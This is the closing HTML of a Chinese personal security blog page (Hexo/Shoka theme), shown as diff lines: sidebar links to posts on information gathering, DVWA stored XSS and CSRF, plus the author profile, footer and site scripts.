主题</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/category/ab339f863e73.html" rel="bookmark" title="信息收集全篇介绍">信息收集全篇介绍</a></li><li><a href="/category/91c1d0f1511b.html" rel="bookmark" title="前置知识">前置知识</a></li><li><a href="/category/cd83d7f3349a.html" rel="bookmark" title="Linux基础命令">Linux基础命令</a></li><li><a href="/category/16e5780ab4d0.html" rel="bookmark" title="Dvwa-Xss存储型">Dvwa-Xss存储型</a></li><li class="active"><a href="/category/504f59315333.html" rel="bookmark" title="HTTP&&CSRF">HTTP&&CSRF</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="江霁月"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">江霁月</p>
+  <div class="description" itemprop="description">专注分享一些关于安全运维和编程语言的知识·本博主爱安全,爱折腾,爱代码</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">55</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">17</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">30</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ppYW5nSmlZdWU=" title="https:&#x2F;&#x2F;github.com&#x2F;JiangJiYue"><i class="ic i-github"></i></span>
+      <span class="exturl item twitter" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9qYW5naml5dWU=" title="https:&#x2F;&#x2F;twitter.com&#x2F;jangjiyue"><i class="ic i-twitter"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/category/cd83d7f3349a.html" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/category/16e5780ab4d0.html" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2022</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">江霁月 @ 江霁月的私人小屋</span>
+  </div>
+  <div class="count">
+    <span class="post-meta-item-icon">
+      <i class="ic i-chart-area"></i>
+    </span>
+    <span title="站点总字数">235k 字</span>
+
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="ic i-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:34</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: 'category/504f59315333.html',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
